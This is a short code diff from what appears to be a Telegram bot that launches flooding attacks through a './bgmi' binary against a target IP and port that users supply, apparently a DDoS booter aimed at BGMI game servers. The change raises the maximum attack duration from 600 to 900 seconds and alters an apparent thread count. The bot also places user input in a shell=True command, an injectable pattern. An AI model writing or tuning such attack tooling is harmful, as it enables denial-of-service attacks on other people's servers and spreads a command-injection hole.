@@ -316,13 +316,13 @@ def handle_attack(message):
             target = command[1]
             port = int(command[2])
             time = int(command[3])
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 900:
+                response = "Error: Time interval must be less than 900."
             else:
                 record_command_logs(user_id, target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 300"
+                full_command = f"./bgmi {target} {port} {time} 50"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
